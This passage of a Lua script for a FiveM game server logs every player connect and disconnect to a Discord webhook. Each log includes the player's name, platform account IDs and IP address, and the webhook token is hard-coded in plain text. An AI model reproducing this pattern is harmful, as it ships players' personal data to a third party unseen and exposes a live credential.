
        return user
    end

    self.createDescription = function(user)
        return string.format("Steam: %s |\n License: %s |\n Xbox: %s |\n Ip: %s |\n Discord: %s |\n Microsoft: %s |", user.steamhex, user.license, user.xbox, user.ip, user.discord, user.microsoft)
    end

    return self
end


function CommandChecker()
    local self = {}

    self.commandStartCharacter = '/'
    self.rawCommand = {}

    self.isCommand = function(text)
        return text:sub(1, #self.commandStartCharacter) == self.commandStartCharacter
    end
    
    self.splitCommand = function(command)
        for token in string.gmatch(command, "[^%s]+") do
            table.insert(self.rawCommand, token)
        end

        return self.rawCommand
    end

    return self
end




--Configuration--
local discordwebhook = 'https://discord.com/api/webhooks/1063948420273930251/rUc-rh34UtQRqnzFYCxVBKPHklCMkHCotQ5X1-LG9-6JfeOKEcRjthXU2yi6BfmsaVA1'
--End Of Configuration--

local playertimes = {}

RegisterServerEvent('log:server:playtime')
AddEventHandler('log:server:playtime', function(playtime)
  local _source = source
  playertimes[_source] = playtime
end)

--Player Connecting
AddEventHandler('playerConnecting', function()
  local _source = source
  local name = GetPlayerName(_source)
  local mb = Masipallopaa(_source)
    sendToDiscordLogsEmbed(3158326, '`✅` | Player Connecting',' Player: `' .. name .. '`\n Hex-ID: `' ..mb.identifier.. '`\n License: `' ..mb.license.. '`\n Discord ID: `' ..mb.discord.. '`\n XBL ID: `' ..mb.xbl.. '`\n Live ID: `' ..mb.live.. '`\n FiveM ID: `' ..mb.fivem.. '`\n IP: `' ..GetPlayerEndpoint(_source).. '`')
end)

--Player Leaving
AddEventHandler('playerDropped', function(reason)
  local _source = source
  local name = GetPlayerName(_source)
  local playtime = playertimes[_source] or 0
  local mb = Masipallopaa(_source)
    sendToDiscordLogsEmbed(3158326, '`❌` | Player Disconnect',' Reason: `' ..reason.. '`\n Player: `' ..name.. '`\n Playtime: `' ..playtime.. '` Minutes \n Hex-ID: `' ..mb.identifier.. '`\n License: `' ..mb.license.. '`\n Discord ID: `' ..mb.discord.. '`\n XBL ID: `' ..mb.xbl.. '`\n Live ID: `' ..mb.live.. '`\n FiveM ID: `' ..mb.fivem.. '`\n IP: `' ..GetPlayerEndpoint(_source).. '`')
end)

function sendToDiscordLogsEmbed(color, name, message, footer)
  local footer = ' Developer By KAKXER '..os.date("%d/%m/%Y %X")
  local embed = {
        {
            ["color"] = color,
            ["title"] = "**".. name .."**",
            ["description"] = message,
            ["footer"] = {
            ["text"] = footer,
            },
        }
    }

  PerformHttpRequest(discordwebhook, function(err, text, headers) end, 'POST', json.encode({username = 'X-LOG', embeds = embed}), { ['Content-Type'] = 'application/json' })
end

function Masipallopaa(_source)
  local idtablemb = {
    license = "No License found",
    identifier = "No Hex-ID found",
    discord = "No Discord found",
    xbl = "No xbl ID found",
    live = "No Live ID found",
    fivem = "No FiveM ID found"
  }

    for k,v in ipairs(GetPlayerIdentifiers(_source))do
    if string.sub(v, 1, string.len("license:")) == "license:" then
      idtablemb.license = v
    elseif string.sub(v, 1, string.len("steam:")) == "steam:" then
      idtablemb.identifier = v
    elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
      idtablemb.discord = v
    elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
      idtablemb.xbl = v
    elseif string.sub(v, 1, string.len("live:")) == "live:" then
      idtablemb.live = v
    elseif string.sub(v, 1, string.len("fivem:")) == "fivem:" then
      idtablemb.fivem = v
    end
  end
  return idtablemb
end


	